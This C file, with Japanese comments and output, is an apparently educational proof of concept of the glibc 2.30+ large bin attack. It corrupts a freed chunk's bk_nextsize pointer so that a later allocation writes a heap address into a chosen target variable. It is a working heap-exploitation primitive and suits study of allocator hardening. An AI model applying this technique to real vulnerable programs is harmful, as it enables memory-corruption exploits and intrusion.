#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*

glibc 2.30 以降向けの large bin attack の再検討

関連するコード断片:

	if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)){
		fwd = bck;
		bck = bck->bk;
		victim->fd_nextsize = fwd->fd;
		victim->bk_nextsize = fwd->fd->bk_nextsize;
		fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
	}


*/

int main(){
  /*ストリームがヒープに干渉するのを防ぐため、IO のバッファリングを無効にします*/
  setvbuf(stdin,NULL,_IONBF,0);
  setvbuf(stdout,NULL,_IONBF,0);
  setvbuf(stderr,NULL,_IONBF,0);

  printf("\n\n");
  printf("glibc 2.30 以降、large bin へのチャンク(chunk)挿入に、2つの新しいチェックが追加されました\n\n");
  printf("チェック 1 : \n");
  printf(">    if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (nextsize)\");\n");
  printf("チェック 2 : \n");
  printf(">    if (bck->fd != fwd)\n");
  printf(">        malloc_printerr (\"malloc(): largebin double linked list corrupted (bk)\");\n\n");
  printf("これにより、従来の large bin attack は防がれます\n");
  printf("しかし、large bin attack を発動できる経路が、まだ1つあります。PoC を以下に示します : \n\n");
  
  printf("====================================================================\n\n");

  size_t target = 0;
  printf("上書きしたい標的はこれです (%p) : %lu\n\n",&target,target);
  size_t *p1 = malloc(0x428);
  printf("まず、大きなチャンク [p1] (%p) を割り当てます\n",p1-2);
  size_t *g1 = malloc(0x18);
  printf("そして、統合(consolidate)を防ぐために、もう1つチャンクを割り当てます\n");

  printf("\n");

  size_t *p2 = malloc(0x418);
  printf("2つ目の大きなチャンク [p2]  (%p) も割り当てます。\n",p2-2);
  printf("このチャンクは [p1] より小さく、同じ large bin に属している必要があります。\n");
  size_t *g2 = malloc(0x18);
  printf("もう一度、統合を防ぐためにガードチャンク(guard chunk)を割り当てます\n");

  printf("\n");

  free(p1);
  printf("2つのうち大きい方を free します --> [p1] (%p)\n",p1-2);
  size_t *g3 = malloc(0x438);
  printf("[p1] を large bin に挿入するために、[p1] より大きいチャンクを割り当てます\n");

  printf("\n");

  free(p2);
  printf("2つのうち小さい方を free します --> [p2] (%p)\n",p2-2);
  printf("この時点で、large bin に1つのチャンク [p1] (%p) があり、\n",p1-2);
  printf("               unsorted bin に1つのチャンク [p2] (%p) があります\n",p2-2);

  printf("\n");

  p1[3] = (size_t)((&target)-4);
  printf("ここで、p1->bk_nextsize を [target-0x20] (%p) に書き換えます\n",(&target)-4);

  printf("\n");

  size_t *g4 = malloc(0x438);
  printf("最後に、[p2] (%p) を large bin に入れるために、[p2] より大きいチャンクをもう1つ割り当てます。入れられるのは [p2] (%p) です\n", p2-2, p2-2);
  printf("新しく挿入されるチャンクが最小のものより小さい場合、glibc は chunk->bk_nextsize をチェックしないため、\n");
  printf("  書き換えた p1->bk_nextsize はエラーを引き起こしません\n");
  printf("[p2] (%p) を largebin に挿入すると、[p1](%p)->bk_nextsize->fd_nextsize が [p2] (%p) のアドレスで上書きされます\n", p2-2, p1-2, p2-2);

  printf("\n");

  printf("今回の場合、target は [p2] (%p) のアドレスで上書きされました。[target] (%p)\n", p2-2, (void *)target);
  printf("標的 (%p) : %p\n",&target,(size_t*)target);

  printf("\n");
  printf("====================================================================\n\n");

  assert((size_t)(p2-2) == target);

  return 0;
}
